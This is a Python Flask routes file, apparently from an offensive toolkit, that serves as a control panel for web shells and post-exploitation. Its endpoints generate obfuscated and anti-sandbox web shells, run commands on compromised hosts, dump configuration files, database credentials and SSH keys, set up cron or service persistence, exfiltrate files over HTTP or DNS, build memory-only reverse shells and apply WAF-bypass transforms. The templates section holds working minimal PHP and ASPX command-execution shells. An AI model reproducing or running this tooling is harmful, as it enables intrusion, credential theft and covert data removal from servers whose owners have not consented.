"""
Web Shell & Post-Exploitation Routes
=====================================
Flask API endpoints for web shell generation and post-exploitation.

Endpoints:
- GET /vuln/webshell - Web shell management dashboard
- POST /api/webshell/generate - Generate obfuscated web shell
- POST /api/webshell/deploy - Deploy web shell to target
- POST /api/webshell/connect - Connect to deployed shell
- POST /api/webshell/execute - Execute command via shell
- GET /api/webshell/status - Check module status
- GET /api/webshell/templates - List available templates
- POST /api/webshell/exfil - Exfiltrate data
- POST /api/webshell/scan - Port scan via shell
- POST /api/webshell/creds - Dump credentials
- POST /api/webshell/persist - Establish persistence
- POST /api/webshell/reverse - Memory-only reverse shell
"""

import os
import sys
import json
import hashlib
import base64
from datetime import datetime
from typing import Dict, Any, List, Optional

from flask import Blueprint, render_template, request, jsonify, Response, current_app

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

# Try to import web shell module
try:
    from evasion.web_shell import (
        WebShellManager,
        WebShellGenerator,
        WebShellConfig,
        ShellType,
        ObfuscationLevel,
        EvasionTechnique,
        PostExploitEngine,
        CredentialDumper,
        MemoryShell,
        BeaconTransition,
        AIObfuscator,
        WAFBypass
    )
    HAS_WEBSHELL = True
except ImportError as e:
    HAS_WEBSHELL = False
    IMPORT_ERROR = str(e)

# Create blueprint
webshell_bp = Blueprint('webshell', __name__)

# Global manager instance
_manager: Optional[WebShellManager] = None
_sessions: Dict[str, PostExploitEngine] = {}

def get_manager() -> Optional[WebShellManager]:
    """Get or create web shell manager instance"""
    global _manager
    if _manager is None and HAS_WEBSHELL:
        config_path = os.path.join(
            os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
            'configs', 'web_shell_config.yaml'
        )
        _manager = WebShellManager(config_path if os.path.exists(config_path) else None)
    return _manager

# =============================================================================
# Dashboard Route
# =============================================================================

@webshell_bp.route('/vuln/webshell')
def webshell_dashboard():
    """Render web shell management dashboard"""
    return render_template('webshell.html')

# =============================================================================
# Status & Info Endpoints
# =============================================================================

@webshell_bp.route('/api/webshell/status')
def webshell_status():
    """Check web shell module status"""
    if not HAS_WEBSHELL:
        return jsonify({
            "available": False,
            "error": f"Web shell module not available: {IMPORT_ERROR}",
            "module": "Web Shell & Post-Exploitation"
        })
    
    manager = get_manager()
    stats = manager.get_shell_stats() if manager else {}
    
    return jsonify({
        "available": True,
        "module": "Web Shell & Post-Exploitation",
        "version": "1.0.0",
        "features": {
            "shell_generation": True,
            "ai_obfuscation": True,
            "waf_bypass": True,
            "post_exploitation": True,
            "credential_dump": True,
            "memory_shell": True,
            "beacon_transition": True
        },
        "supported_types": [st.value for st in ShellType],
        "obfuscation_levels": [ol.name for ol in ObfuscationLevel],
        "evasion_techniques": [et.name for et in EvasionTechnique],
        "stats": stats
    })

@webshell_bp.route('/api/webshell/templates')
def list_templates():
    """List available shell templates"""
    if not HAS_WEBSHELL:
        return jsonify({"error": "Module not available"}), 503
    
    templates = {
        "minimal": {
            "php": "<?=`$_GET[0]`;",
            "aspx": "<%@Page Language=\"C#\"%><%System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \"+Request[\"c\"]);%>",
            "description": "Minimal footprint, basic execution"
        },
        "standard": {
            "php": "Full-featured PHP web shell with file ops, command exec, port scan",
            "aspx": "Full-featured ASPX web shell with system info, file ops",
            "jsp": "Full-featured JSP web shell for Java environments",
            "description": "Complete functionality with obfuscation"
        },
        "stealth": {
            "php": "Heavily obfuscated with anti-analysis",
            "aspx": "Encrypted communications, anti-debug",
            "description": "Maximum evasion, encrypted comms"
        },
        "memory": {
            "php": "Memory-only reverse shell",
            "powershell": "Fileless PowerShell reverse shell",
            "python": "Memory-resident Python shell",
            "description": "No disk artifacts, memory-only execution"
        }
    }
    
    return jsonify({
        "templates": templates,
        "shell_types": [st.value for st in ShellType]
    })

# =============================================================================
# Shell Generation Endpoints
# =============================================================================

@webshell_bp.route('/api/webshell/generate', methods=['POST'])
def generate_shell():
    """Generate an obfuscated web shell"""
    if not HAS_WEBSHELL:
        return jsonify({"error": "Module not available"}), 503
    
    data = request.get_json() or {}
    
    # Parse parameters
    shell_type_str = data.get('type', 'php')
    obfuscation_level = data.get('obfuscation', 3)
    password = data.get('password', '')
    evasion_list = data.get('evasion', [])
    callback_url = data.get('callback_url')
    encrypted_comms = data.get('encrypted_comms', True)
    anti_debug = data.get('anti_debug', True)
    anti_sandbox = data.get('anti_sandbox', True)
    self_destruct = data.get('self_destruct', False)
    
    try:
        # Convert shell type
        shell_type = ShellType(shell_type_str)
        
        # Convert obfuscation level
        obfuscation = ObfuscationLevel(obfuscation_level)
        
        # Convert evasion techniques
        evasion_map = {e.name.lower(): e for e in EvasionTechnique}
        evasion_techniques = [evasion_map[e.lower()] for e in evasion_list if e.lower() in evasion_map]
        
        # Create config
        config = WebShellConfig(
            shell_type=shell_type,
            obfuscation_level=obfuscation,
            password=password,
            evasion_techniques=evasion_techniques,
            callback_url=callback_url,
            encrypted_comms=encrypted_comms,
            anti_debug=anti_debug,
            anti_sandbox=anti_sandbox,
            self_destruct=self_destruct
        )
        
        # Generate shell
        generator = WebShellGenerator(config)
        payload = generator.generate()
        
        # Store in manager
        manager = get_manager()
        if manager:
            manager.shells[payload.hash_md5] = payload
        
        return jsonify({
            "success": True,
            "payload": {
                "code": payload.code,
                "type": payload.shell_type.value,
                "obfuscation": payload.obfuscation_level.name,
                "techniques": payload.techniques_used,
                "size_bytes": payload.size_bytes,
                "hash_md5": payload.hash_md5,
                "hash_sha256": payload.hash_sha256,
                "metadata": payload.metadata
            }
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 400

@webshell_bp.route('/api/webshell/obfuscate', methods=['POST'])
def obfuscate_code():
    """Obfuscate custom code"""
    if not HAS_WEBSHELL:
        return jsonify({"error": "Module not available"}), 503
    
    data = request.get_json() or {}
    code = data.get('code', '')
    language = data.get('language', 'php')
    level = data.get('level', 3)
    
    if not code:
        return jsonify({"error": "No code provided"}), 400
    
    try:
        obfuscator = AIObfuscator()
        obfuscation_level = ObfuscationLevel(level)
        
        obfuscated = obfuscator.obfuscate(code, language, obfuscation_level)
        
        return jsonify({
            "success": True,
            "original_size": len(code),
            "obfuscated_size": len(obfuscated),
            "obfuscated_code": obfuscated
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 400

# =============================================================================
# Connection & Execution Endpoints
# =============================================================================

@webshell_bp.route('/api/webshell/connect', methods=['POST'])
def connect_shell():
    """Connect to a deployed web shell"""
    if not HAS_WEBSHELL:
        return jsonify({"error": "Module not available"}), 503
    
    data = request.get_json() or {}
    shell_url = data.get('url', '')
    password = data.get('password', '')
    
    if not shell_url:
        return jsonify({"error": "Shell URL required"}), 400
    
    try:
        session = PostExploitEngine(shell_url, password)
        
        # Test connection
        info = session.system_info()
        
        if info:
            # Store session
            session_id = hashlib.md5(shell_url.encode()).hexdigest()[:12]
            _sessions[session_id] = session
            
            return jsonify({
                "success": True,
                "session_id": session_id,
                "system_info": info
            })
        else:
            return jsonify({
                "success": False,
                "error": "Could not connect to shell"
            }), 400
            
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 400

@webshell_bp.route('/api/webshell/execute', methods=['POST'])
def execute_command():
    """Execute command via web shell"""
    if not HAS_WEBSHELL:
        return jsonify({"error": "Module not available"}), 503
    
    data = request.get_json() or {}
    session_id = data.get('session_id', '')
    command = data.get('command', '')
    
    # Also support direct URL + password
    shell_url = data.get('url', '')
    password = data.get('password', '')
    
    if not command:
        return jsonify({"error": "No command provided"}), 400
    
    try:
        # Get session
        if session_id and session_id in _sessions:
            session = _sessions[session_id]
        elif shell_url:
            session = PostExploitEngine(shell_url, password)
        else:
            return jsonify({"error": "Session ID or URL required"}), 400
        
        # Execute command
        output = session.execute(command)
        
        return jsonify({
            "success": True,
            "command": command,
            "output": output
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 400

# =============================================================================
# Post-Exploitation Endpoints
# =============================================================================

@webshell_bp.route('/api/webshell/scan', methods=['POST'])
def port_scan():
    """Port scan via web shell"""
    if not HAS_WEBSHELL:
        return jsonify({"error": "Module not available"}), 503
    
    data = request.get_json() or {}
    session_id = data.get('session_id', '')
    shell_url = data.get('url', '')
    password = data.get('password', '')
    
    target_host = data.get('host', '')
    ports = data.get('ports', [21, 22, 80, 443, 445, 3389, 8080])
    
    if not target_host:
        return jsonify({"error": "Target host required"}), 400
    
    try:
        # Get session
        if session_id and session_id in _sessions:
            session = _sessions[session_id]
        elif shell_url:
            session = PostExploitEngine(shell_url, password)
        else:
            return jsonify({"error": "Session ID or URL required"}), 400
        
        # Scan ports
        results = session.port_scan(target_host, ports)
        
        # Format results
        open_ports = [port for port, is_open in results.items() if is_open]
        closed_ports = [port for port, is_open in results.items() if not is_open]
        
        return jsonify({
            "success": True,
            "target": target_host,
            "open_ports": open_ports,
            "closed_ports": closed_ports,
            "raw_results": results
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 400

@webshell_bp.route('/api/webshell/ssrf', methods=['POST'])
def ssrf_probe():
    """SSRF probe via web shell"""
    if not HAS_WEBSHELL:
        return jsonify({"error": "Module not available"}), 503
    
    data = request.get_json() or {}
    session_id = data.get('session_id', '')
    shell_url = data.get('url', '')
    password = data.get('password', '')
    
    target_url = data.get('target_url', '')
    
    if not target_url:
        return jsonify({"error": "Target URL required"}), 400
    
    try:
        # Get session
        if session_id and session_id in _sessions:
            session = _sessions[session_id]
        elif shell_url:
            session = PostExploitEngine(shell_url, password)
        else:
            return jsonify({"error": "Session ID or URL required"}), 400
        
        # Probe URL
        response = session.ssrf_probe(target_url)
        
        return jsonify({
            "success": True,
            "target_url": target_url,
            "response": response[:5000] if response else None,  # Limit response size
            "response_length": len(response) if response else 0
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 400

@webshell_bp.route('/api/webshell/creds', methods=['POST'])
def dump_credentials():
    """Dump credentials via web shell"""
    if not HAS_WEBSHELL:
        return jsonify({"error": "Module not available"}), 503
    
    data = request.get_json() or {}
    session_id = data.get('session_id', '')
    shell_url = data.get('url', '')
    password = data.get('password', '')
    
    try:
        # Get session
        if session_id and session_id in _sessions:
            session = _sessions[session_id]
        elif shell_url:
            session = PostExploitEngine(shell_url, password)
        else:
            return jsonify({"error": "Session ID or URL required"}), 400
        
        # Dump credentials
        dumper = CredentialDumper(session)
        
        web_configs = dumper.dump_web_configs()
        db_creds = dumper.dump_database_creds()
        ssh_keys = dumper.dump_ssh_keys()
        
        return jsonify({
            "success": True,
            "credentials": {
                "web_configs": list(web_configs.keys()),
                "web_config_contents": {k: v[:500] for k, v in web_configs.items()},  # Truncate
                "database_creds": db_creds,
                "ssh_keys_found": list(ssh_keys.keys())
            }
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 400

@webshell_bp.route('/api/webshell/persist', methods=['POST'])
def establish_persistence():
    """Establish persistence via web shell"""
    if not HAS_WEBSHELL:
        return jsonify({"error": "Module not available"}), 503
    
    data = request.get_json() or {}
    session_id = data.get('session_id', '')
    shell_url = data.get('url', '')
    password = data.get('password', '')
    
    method = data.get('method', 'cron')  # cron, startup, service
    
    try:
        # Get session
        if session_id and session_id in _sessions:
            session = _sessions[session_id]
        elif shell_url:
            session = PostExploitEngine(shell_url, password)
        else:
            return jsonify({"error": "Session ID or URL required"}), 400
        
        # Establish persistence
        result = session.establish_persistence(method)
        
        return jsonify({
            "success": result,
            "method": method,
            "message": f"Persistence established via {method}" if result else "Failed to establish persistence"
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 400

@webshell_bp.route('/api/webshell/exfil', methods=['POST'])
def exfiltrate_data():
    """Exfiltrate data via web shell"""
    if not HAS_WEBSHELL:
        return jsonify({"error": "Module not available"}), 503
    
    data = request.get_json() or {}
    session_id = data.get('session_id', '')
    shell_url = data.get('url', '')
    password = data.get('password', '')
    
    file_path = data.get('path', '')
    method = data.get('method', 'http')  # http, dns
    
    if not file_path:
        return jsonify({"error": "File path required"}), 400
    
    try:
        # Get session
        if session_id and session_id in _sessions:
            session = _sessions[session_id]
        elif shell_url:
            session = PostExploitEngine(shell_url, password)
        else:
            return jsonify({"error": "Session ID or URL required"}), 400
        
        # Exfiltrate
        result = session.exfiltrate(file_path, method)
        
        return jsonify({
            "success": True,
            "path": file_path,
            "method": method,
            "data": result if method == "http" else None,
            "chunks": result if method == "dns" else None
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 400

# =============================================================================
# Reverse Shell Endpoints
# =============================================================================

@webshell_bp.route('/api/webshell/reverse', methods=['POST'])
def generate_reverse_shell():
    """Generate memory-only reverse shell payload"""
    if not HAS_WEBSHELL:
        return jsonify({"error": "Module not available"}), 503
    
    data = request.get_json() or {}
    host = data.get('host', '')
    port = data.get('port', 4444)
    shell_type = data.get('type', 'php')  # php, powershell, python
    
    if not host:
        return jsonify({"error": "Listener host required"}), 400
    
    try:
        if shell_type == 'php':
            payload = MemoryShell.generate_php_memory_shell(host, port)
        elif shell_type == 'powershell':
            payload = MemoryShell.generate_powershell_memory_shell(host, port)
        elif shell_type == 'python':
            payload = MemoryShell.generate_python_memory_shell(host, port)
        else:
            return jsonify({"error": f"Unsupported shell type: {shell_type}"}), 400
        
        return jsonify({
            "success": True,
            "type": shell_type,
            "host": host,
            "port": port,
            "payload": payload,
            "listener_command": f"nc -lvnp {port}" if shell_type != 'powershell' else f"nc -lvnp {port}",
            "note": "Memory-only execution - no disk artifacts"
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 400

# =============================================================================
# Beacon Transition Endpoint
# =============================================================================

@webshell_bp.route('/api/webshell/beacon-transition', methods=['POST'])
def beacon_to_webshell():
    """Transition from beacon to web shell"""
    if not HAS_WEBSHELL:
        return jsonify({"error": "Module not available"}), 503
    
    data = request.get_json() or {}
    beacon_url = data.get('beacon_url', '')
    target_path = data.get('target_path', '')
    shell_type = data.get('shell_type', 'php')
    password = data.get('password', '')
    
    if not beacon_url or not target_path:
        return jsonify({"error": "Beacon URL and target path required"}), 400
    
    try:
        # Create transition handler
        transition = BeaconTransition(beacon_url)
        
        # Create shell config
        config = WebShellConfig(
            shell_type=ShellType(shell_type),
            obfuscation_level=ObfuscationLevel.HIGH,
            password=password,
            anti_debug=True,
            anti_sandbox=True
        )
        
        # Deploy shell
        success = transition.deploy_webshell(target_path, config)
        
        if success:
            return jsonify({
                "success": True,
                "message": "Web shell deployed successfully",
                "shell_path": target_path,
                "password": password
            })
        else:
            return jsonify({
                "success": False,
                "error": "Failed to deploy web shell"
            }), 400
            
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 400

# =============================================================================
# WAF Bypass Testing
# =============================================================================

@webshell_bp.route('/api/webshell/waf-test', methods=['POST'])
def test_waf_bypass():
    """Test WAF bypass techniques on payload"""
    if not HAS_WEBSHELL:
        return jsonify({"error": "Module not available"}), 503
    
    data = request.get_json() or {}
    payload = data.get('payload', '')
    language = data.get('language', 'php')
    techniques = data.get('techniques', ['chunked_transfer', 'sleep_injection', 'string_concat'])
    
    if not payload:
        return jsonify({"error": "Payload required"}), 400
    
    try:
        bypass = WAFBypass()
        
        # Convert techniques
        evasion_map = {e.name.lower(): e for e in EvasionTechnique}
        evasion_list = [evasion_map[t.lower()] for t in techniques if t.lower() in evasion_map]
        
        # Apply techniques
        bypassed = bypass.apply(payload, evasion_list, language)
        
        return jsonify({
            "success": True,
            "original": payload,
            "original_size": len(payload),
            "bypassed": bypassed,
            "bypassed_size": len(bypassed),
            "techniques_applied": [t.name for t in evasion_list]
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 400

# =============================================================================
# Demo Endpoint
# =============================================================================

@webshell_bp.route('/api/webshell/demo')
def demo_shell():
    """Generate a demo shell for testing"""
    if not HAS_WEBSHELL:
        return jsonify({"error": "Module not available"}), 503
    
    try:
        config = WebShellConfig(
            shell_type=ShellType.PHP,
            obfuscation_level=ObfuscationLevel.MEDIUM,
            password="demo123",
            evasion_techniques=[
                EvasionTechnique.STRING_CONCAT,
                EvasionTechnique.DEAD_CODE_INJECTION,
                EvasionTechnique.VARIABLE_RENAME
            ],
            anti_debug=True,
            encrypted_comms=True
        )
        
        generator = WebShellGenerator(config)
        payload = generator.generate()
        
        return jsonify({
            "success": True,
            "demo": {
                "type": payload.shell_type.value,
                "obfuscation": payload.obfuscation_level.name,
                "size_bytes": payload.size_bytes,
                "hash_md5": payload.hash_md5,
                "preview": payload.code[:500] + "..." if len(payload.code) > 500 else payload.code,
                "techniques": payload.techniques_used
            },
            "usage": {
                "password": "demo123",
                "auth_header": "X-Auth: md5('demo123')",
                "example_request": {
                    "action": "exec",
                    "params": {"cmd": "whoami"},
                    "key": "demo123"
                }
            }
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 400
